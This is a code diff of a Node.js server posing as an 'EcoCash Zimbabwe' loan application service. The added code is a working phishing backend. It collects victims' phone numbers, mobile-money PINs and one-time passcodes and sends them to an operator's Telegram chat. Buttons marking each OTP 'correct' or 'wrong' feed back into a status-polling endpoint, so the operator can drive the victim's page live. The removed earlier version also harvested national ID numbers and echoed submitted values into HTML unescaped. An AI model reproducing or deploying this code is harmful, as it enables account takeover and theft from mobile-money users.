@@ -1,305 +1,165 @@
 require('dotenv').config();
-const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
+const cors = require('cors');
+const path = require('path');
+const fetch = require('node-fetch');
 
-// --- 1. Express Server Setup (Required for Render Web Service Uptime & Sub-Admin Loan Portals) ---
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
+app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-// In-memory storage for submitted EcoCash loan applications
-const loanApplications = [];
+const publicPath = path.join(__dirname, 'public');
+app.use(express.static(publicPath));
 
-app.get('/', (req, res) => {
-    res.status(200).send('EcoCash Zimbabwe Telegram Bot & Loan Portal is running live! 🟢🇿🇼');
-});
+const activeApplications = new Map();
 
-// Dynamic route mapping for Sub-Admin web panels & Loan Application Forms (e.g., /admin-002)
-app.get('/:adminRoute', (req, res) => {
-    try {
-        const adminRoute = req.params.adminRoute;
-        const subAdminKeys = getSubAdminKeys();
-        
-        const matchingKey = subAdminKeys.find(key => {
-            const formattedSlug = key.toLowerCase().replace(/_/g, '-');
-            return formattedSlug === adminRoute.toLowerCase() || key.toLowerCase() === adminRoute.toLowerCase();
-        });
-
-        if (matchingKey || adminRoute.toLowerCase().startsWith('admin-')) {
-            const assignedChatId = matchingKey ? process.env[matchingKey] : "Dynamic Sub-Admin";
-            
-            // Render the Sub-Admin Portal with the Zimbabwe EcoCash Loan Form and Submissions List
-            res.status(200).send(`
-                <html>
-                    <head>
-                        <title>EcoCash Zimbabwe Sub-Admin Portal - ${adminRoute}</title>
-                        <style>
-                            body { font-family: Arial, sans-serif; padding: 30px; background: #f4f6f9; color: #333; }
-                            .container { max-width: 700px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-                            h2 { color: #d32f2f; margin-top: 0; }
-                            .badge { color: green; font-weight: bold; }
-                            .form-group { margin-bottom: 15px; }
-                            label { display: block; margin-bottom: 5px; font-weight: bold; }
-                            input, select, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-                            button { background: #d32f2f; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-                            button:hover { background: #b71c1c; }
-                            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-                            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 14px; }
-                            th { background-color: #f2f2f2; }
-                        </style>
-                    </head>
-                    <body>
-                        <div class="container">
-                            <h2>📱 EcoCash Zimbabwe Sub-Admin Portal 🇿🇼</h2>
-                            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-                            <p><strong>Portal Route:</strong> /${adminRoute}</p>
-                            <p><strong>Associated Chat ID:</strong> ${assignedChatId}</p>
-                            <p><strong>Status:</strong> <span class="badge">Authorized & Active ✅</span></p>
-                            
-                            <h3 style="margin-top: 30px;">📝 Submit EcoCash Loan Application (USD / ZiG)</h3>
-                            <form action="/submit-loan/${adminRoute}" method="POST">
-                                <div class="form-group">
-                                    <label for="clientName">Full Name:</label>
-                                    <input type="text" id="clientName" name="clientName" required placeholder="Enter client full name">
-                                </div>
-                                <div class="form-group">
-                                    <label for="phoneNumber">EcoCash Mobile Number (+263):</label>
-                                    <input type="text" id="phoneNumber" name="phoneNumber" required placeholder="e.g., +263771234567">
-                                </div>
-                                <div class="form-group">
-                                    <label for="nationalId">Zimbabwe National ID Number:</label>
-                                    <input type="text" id="nationalId" name="nationalId" required placeholder="e.g., 63-1234567-A-89">
-                                </div>
-                                <div class="form-group">
-                                    <label for="currency">Loan Currency:</label>
-                                    <select id="currency" name="currency" required>
-                                        <option value="USD">USD ($)</option>
-                                        <option value="ZiG">ZiG</option>
-                                    </select>
-                                </div>
-                                <div class="form-group">
-                                    <label for="loanAmount">Loan Amount Requested:</label>
-                                    <input type="number" id="loanAmount" name="loanAmount" required placeholder="Enter amount">
-                                </div>
-                                <div class="form-group">
-                                    <label for="purpose">Loan Purpose:</label>
-                                    <textarea id="purpose" name="purpose" rows="3" required placeholder="Reason for loan (e.g., Business capital, school fees)"></textarea>
-                                </div>
-                                <button type="submit">Submit Loan Application 🚀</button>
-                            </form>
-
-                            <h3 style="margin-top: 40px;">📋 Recent Submitted Loans on this Portal</h3>
-                            <table>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>EcoCash Phone</th>
-                                    <th>National ID</th>
-                                    <th>Amount</th>
-                                    <th>Purpose</th>
-                                </tr>
-                                ${loanApplications.length === 0 ? '<tr><td colspan="5" style="text-align:center;">No loan applications submitted yet. ℹ️</td></tr>' : 
-                                    loanApplications.map(loan => `
-                                        <tr>
-                                            <td>${loan.clientName}</td>
-                                            <td>${loan.phoneNumber}</td>
-                                            <td>${loan.nationalId}</td>
-                                            <td>${loan.loanAmount} ${loan.currency}</td>
-                                            <td>${loan.purpose}</td>
-                                        </tr>
-                                    `).join('')}
-                            </table>
-                        </div>
-                    </body>
-                </html>
-            `);
-        } else {
-            res.status(404).send('404 - Portal Not Found or Unauthorized Access. ❌');
-        }
-    } catch (routeError) {
-        console.error("Express Route Error:", routeError);
-        res.status(500).send('500 - Internal Server Error on Web Route. ❌');
-    }
-});
-
-// Handle incoming loan form submissions from the web portal
-app.post('/submit-loan/:adminRoute', (req, res) => {
-    try {
-        const { adminRoute } = req.params;
-        const { clientName, phoneNumber, nationalId, currency, loanAmount, purpose } = req.body;
-
-        // Store submission
-        const newLoan = { clientName, phoneNumber, nationalId, currency, loanAmount, purpose, adminRoute, date: new Date().toLocaleString() };
-        loanApplications.push(newLoan);
-
-        // Redirect back to the admin portal confirmation view
-        res.send(`
-            <html>
-                <body style="font-family: Arial, sans-serif; padding: 40px; text-align: center; background: #f4f6f9;">
-                    <div style="max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 8px; border: 1px solid #d32f2f; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
-                        <h2 style="color: #d32f2f;">🎉 EcoCash Loan Application Submitted! 🇿🇼</h2>
-                        <p>Thank you, <strong>${clientName}</strong>. Your loan request for <strong>${loanAmount} ${currency}</strong> has been successfully logged.</p>
-                        <a href="/${adminRoute}" style="display: inline-block; margin-top: 20px; background: #d32f2f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px;">Back to Portal ⬅️</a>
-                    </div>
-                </body>
-            </html>
-        `);
-    } catch (err) {
-        console.error("Error processing loan submission:", err);
-        res.status(500).send('500 - Error processing loan submission.');
-    }
-});
-
-const server = app.listen(PORT, () => {
-    console.log(`Server is listening on port ${PORT} 🚀`);
-});
-
-server.on('error', (serverError) => {
-    console.error("Express Server Error:", serverError);
-});
-
-// --- 2. Initialize Telegram Bot ---
-const token = process.env.TELEGRAM_BOT_TOKEN;
-if (!token) {
-    console.error("Error: TELEGRAM_BOT_TOKEN is missing in environment variables. ❌");
-    process.exit(1);
+function formatZimbabwePhone(phone) {
+  let formattedPhone = phone || '';
+  if (formattedPhone.startsWith('+263')) {
+    formattedPhone = formattedPhone.replace('+263', '');
+  } else if (formattedPhone.startsWith('263')) {
+    formattedPhone = formattedPhone.slice(3);
+  } else if (formattedPhone.startsWith('0')) {
+    formattedPhone = formattedPhone.slice(1);
+  }
+  return formattedPhone;
 }
 
-const bot = new TelegramBot(token, { polling: true });
+// Complete Submission Handler with Telegram Integration
+app.post('/api/submit-full-application', async (req, res) => {
+  try {
+    const data = req.body;
+    const formattedPhone = formatZimbabwePhone(data.phone);
+    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
+    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
 
-bot.on('polling_error', (error) => {
-    console.error("Telegram Polling Error:", error.message || error);
-});
+    activeApplications.set(appReference, {
+      ...data,
+      formattedPhone,
+      status: 'PENDING_OTP'
+    });
 
-bot.on('error', (error) => {
-    console.error("Telegram General Error:", error.message || error);
-});
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
 
-// Helper functions for Sub-Admins
-function getSubAdminKeys() {
-    return Object.keys(process.env).filter(key => key.startsWith('ADMIN_') && key !== 'ADMIN_1_CHAT_ID');
-}
+    if (botToken && chatId) {
+      const currentTimestamp = new Date().toLocaleString('en-US', {
+        timeZone: 'Africa/Harare',
+        year: 'numeric',
+        month: 'numeric',
+        day: 'numeric',
+        hour: 'numeric',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+      });
 
-function checkIfSubAdmin(chatIdString) {
-    const subAdminKeys = getSubAdminKeys();
-    return subAdminKeys.some(key => process.env[key] === chatIdString);
-}
+      const messageText = `🆕 <b>NEW ECOCASH APPLICATION</b>\n\n` +
+                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
+                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
+                          `💼 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
+                          `💵 <b>Monthly Income:</b> $${data.monthlyPayments || 'N/A'}\n` +
+                          `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
+                          `⏳ <b>Repayment Term:</b> ${data.repaymentTime || 'N/A'}\n` +
+                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
+                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
+                          `💬 <b>OTP (6-digit):</b> <code>${data.otpCode || 'N/A'}</code>\n` +
+                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
+                          `❓ <b>VERIFY OTP ACCURACY:</b>`;
 
-function getSubAdminKeyByChatId(chatIdString) {
-    const subAdminKeys = getSubAdminKeys();
-    return subAdminKeys.find(key => process.env[key] === chatIdString);
-}
-
-// Handler for /start command
-bot.onText(/\/start/, async (msg) => {
-    try {
-        const chatId = msg.chat.id;
-        const chatIdStr = chatId.toString();
-        const firstName = msg.from.first_name || "User";
-        const username = msg.from.username ? `@${msg.from.username}` : "No username";
-
-        // 1. Main Admin (ADMIN_1)
-        if (chatIdStr === process.env.ADMIN_1_CHAT_ID) {
-            return await sendMainAdminDashboard(chatId, firstName, username);
-        }
-
-        // 2. Sub-Admin
-        if (checkIfSubAdmin(chatIdStr)) {
-            return await sendSubAdminDashboard(chatId, firstName, username, chatIdStr);
-        }
-
-        // 3. Regular User
-        const welcomeMessage = 
-`📱 ECOCASH ZIMBABWE LOAN SERVICE 🇿🇼💳
-----------------------------------------
-Welcome, ${firstName}! 👋
-
-🔹 Chat ID: ${chatId}
-🔹 Username: ${username}
-
-Please contact an administrator for access or account approval. ⚠️`;
-
-        await bot.sendMessage(chatId, welcomeMessage);
-    } catch (error) {
-        console.error("Error handling /start command:", error.message || error);
-    }
-});
-
-// Main Admin Dashboard Sender
-async function sendMainAdminDashboard(chatId, firstName, username) {
-    const subAdminKeys = getSubAdminKeys();
-    let subAdminListText = "";
-
-    if (subAdminKeys.length === 0) {
-        subAdminListText = "No sub-admins currently configured via environment variables. ℹ️";
-    } else {
-        subAdminListText = subAdminKeys.map(key => `🔹 ${key}: ${process.env[key]}`).join('\n');
-    }
-
-    const dashboardText = 
-`📱 ECOCASH ZIMBABWE ADMIN BOT 🇿🇼⚙️
-----------------------------------------
-👤 User Info:
-▫️ Name: ${firstName}
-▫️ Username: ${username}
-▫️ Chat ID: ${chatId}
-▫️ Role: Main Admin 👑
-
-👑 MAIN ADMIN CONTROL PANEL
-Approve payment status to authorize sub-admins (Admin-002, Admin-003 onwards): 📋
-
-${subAdminListText}`;
-
-    const options = {
+      const telegramPayload = {
+        chat_id: chatId,
+        text: messageText,
+        parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [
-                [{ text: "🌐 Open Main Dashboard", callback_data: "main_dashboard" }]
+          inline_keyboard: [
+            [
+              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
+              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
             ]
+          ]
         }
-    };
+      };
 
-    await bot.sendMessage(chatId, dashboardText, options);
-}
-
-// Sub-Admin Dashboard Sender
-async function sendSubAdminDashboard(chatId, firstName, username, chatIdStr) {
-    const subAdminKey = getSubAdminKeyByChatId(chatIdStr);
-    const routeSlug = subAdminKey ? subAdminKey.toLowerCase().replace(/_/g, '-') : "admin-portal";
-    const baseUrl = process.env.RENDER_EXTERNAL_URL || "https://ecocash-aot6.onrender.com";
-    const personalPortalLink = `${baseUrl}/${routeSlug}`;
-
-    const dashboardText = 
-`📱 WELCOME TO ECOCASH ZIMBABWE APP 🇿🇼🎉
-----------------------------------------
-YOU CHAT ID: ${chatId} 🆔
-THANK YOU FOR JOINING. 🙌
-
-👤 Sub-Admin Details:
-▫️ Name: ${firstName}
-▫️ Username: ${username}
-▫️ Role: Sub-Admin 🛡️
-
-🔗 Your Private Loan Portal Web Link:
-${personalPortalLink}`;
-
-    await bot.sendMessage(chatId, dashboardText);
-}
-
-// Handle callback queries
-bot.on('callback_query', async (query) => {
-    try {
-        const chatId = query.message.chat.id;
-        const data = query.data;
-
-        if (data === "main_dashboard") {
-            await bot.answerCallbackQuery(query.id, { text: "Main Dashboard options loaded. ✅" });
-            await bot.sendMessage(chatId, "🛠️ Main Admin Tools: Use environment variables to assign or revoke sub-admins.");
-        }
-    } catch (error) {
-        console.error("Error handling callback query:", error.message || error);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telegramPayload)
+      });
     }
+
+    res.status(201).json({ success: true, appReference });
+  } catch (error) {
+    console.error("Submission error:", error);
+    res.status(500).json({ success: false, error: "Internal Server Error" });
+  }
 });
 
-console.log("EcoCash Zimbabwe Telegram bot is running and listening for messages... 🤖🇿🇼");
-                                                            
+// Status Polling Endpoint
+app.get('/api/check-status/:appReference', (req, res) => {
+  const { appReference } = req.params;
+  const appData = activeApplications.get(appReference);
+
+  if (!appData) {
+    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
+  }
+
+  res.json({ success: true, status: appData.status });
+});
+
+// Telegram Callback Query Handler (Inline Keyboard Actions)
+app.post('/api/telegram-webhook', async (req, res) => {
+  res.sendStatus(200);
+  const { callback_query } = req.body;
+  if (!callback_query) return;
+
+  const actionData = callback_query.data;
+  const chatId = callback_query.message.chat.id;
+  const messageId = callback_query.message.message_id;
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+
+  if (actionData.startsWith('otp_correct_')) {
+    const appReference = actionData.replace('otp_correct_', '');
+    if (activeApplications.has(appReference)) {
+      const appData = activeApplications.get(appReference);
+      appData.status = 'OTP_APPROVED';
+      activeApplications.set(appReference, appData);
+    }
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Marked as CORRECT ✅</b>`;
+    await editTelegramMessage(botToken, chatId, messageId, updatedText);
+  }
+
+  if (actionData.startsWith('otp_wrong_')) {
+    const appReference = actionData.replace('otp_wrong_', '');
+    if (activeApplications.has(appReference)) {
+      const appData = activeApplications.get(appReference);
+      appData.status = 'OTP_REJECTED';
+      activeApplications.set(appReference, appData);
+    }
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Marked as WRONG ❌</b>`;
+    await editTelegramMessage(botToken, chatId, messageId, updatedText);
+  }
+});
+
+async function editTelegramMessage(botToken, chatId, messageId, text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
+    });
+  } catch (err) {
+    console.error("Telegram edit error:", err.message);
+  }
+}
+
+app.get('*', (req, res) => {
+  res.sendFile(path.join(publicPath, 'index.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
+});
+      
